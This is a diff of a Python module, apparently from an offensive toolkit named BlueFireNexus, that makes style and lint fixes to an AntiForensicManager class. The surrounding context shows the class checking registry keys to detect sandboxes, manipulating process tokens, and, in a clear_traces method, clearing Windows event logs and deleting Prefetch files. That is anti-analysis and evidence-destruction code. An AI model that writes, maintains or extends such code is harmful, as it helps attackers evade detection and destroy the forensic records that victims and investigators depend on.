@@ -1,18 +1,19 @@
 import os
-import sys
 import platform
+
 import psutil
-import ctypes
+
 # Only import win32 modules if on Windows
 if platform.system() == "Windows":
     import win32api
     import win32con
     import win32security
 # Keep typing imports separate
-from typing import List, Dict, Optional
+from typing import Dict, Optional
+
 # Use absolute imports if possible, assume they work
-from src.core.logger import get_logger # Check if relative is needed based on structure
-from src.core.security import security # Check if relative is needed
+from src.core.logger import get_logger  # Check if relative is needed based on structure
+from src.core.security import security  # Check if relative is needed
 
 logger = get_logger(__name__)
 
@@ -109,7 +110,7 @@ class AntiForensicManager:
                      # Attempt to open the key with read access
                      key_handle = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, key_path, 0, win32con.KEY_READ)
                      if key_handle:
-                         logger.debug(f"Sandbox indicator registry key found: HKLM\{key_path}")
+                         logger.debug(rf"Sandbox indicator registry key found: HKLM\{key_path}")
                          win32api.RegCloseKey(key_handle)
                          return True
                  except OSError as e: # Catch potential errors like key not found
@@ -117,9 +118,9 @@ class AntiForensicManager:
                      if e.winerror == 2:
                          continue # Key doesn't exist, continue checking others
                      else:
-                         logger.warning(f"Error accessing registry key HKLM\{key_path}: {e}")
+                         logger.warning(rf"Error accessing registry key HKLM\{key_path}: {e}")
                  except Exception as e: # Catch other unexpected errors
-                     logger.warning(f"Unexpected error checking registry key HKLM\{key_path}: {e}")
+                     logger.warning(rf"Unexpected error checking registry key HKLM\{key_path}: {e}")
                  finally:
                      # Ensure the handle is closed if it was opened
                      if key_handle:
@@ -300,11 +301,15 @@ class AntiForensicManager:
         finally:
             # Ensure handles are closed
             if token_handle:
-                try: win32api.CloseHandle(token_handle)
-                except: pass
+                try:
+                    win32api.CloseHandle(token_handle)
+                except Exception:
+                    pass
             if process_handle:
-                try: win32api.CloseHandle(process_handle)
-                except: pass
+                try:
+                    win32api.CloseHandle(process_handle)
+                except Exception:
+                    pass
 
     def clear_traces(self) -> bool:
         """
@@ -324,7 +329,7 @@ class AntiForensicManager:
              cleared_any_log = False
              failed_any_log = False
              try:
-                 import subprocess # Import here as it's only needed for this section
+                 import subprocess  # Import here as it's only needed for this section
              except ImportError:
                  logger.error("`subprocess` module not found. Cannot attempt to clear event logs.")
                  failed_any_log = True
@@ -370,7 +375,7 @@ class AntiForensicManager:
 
         # --- Clear Prefetch (Windows Only) ---
         if self.is_windows:
-             prefetch_dir = os.path.join(os.environ.get("SystemRoot", "C:\Windows"), "Prefetch")
+             prefetch_dir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Prefetch")
              if os.path.isdir(prefetch_dir): # Check if it's a directory
                   logger.info("Attempting to clear Windows prefetch files (requires elevation)...")
                   cleared_any_prefetch = False
@@ -479,4 +484,4 @@ class AntiForensicManager:
 
 # --- Instance ---
 # Create a global instance for easy import, or manage instantiation within BlueFireNexus
-anti_forensic = AntiForensicManager() 
+anti_forensic = AntiForensicManager()
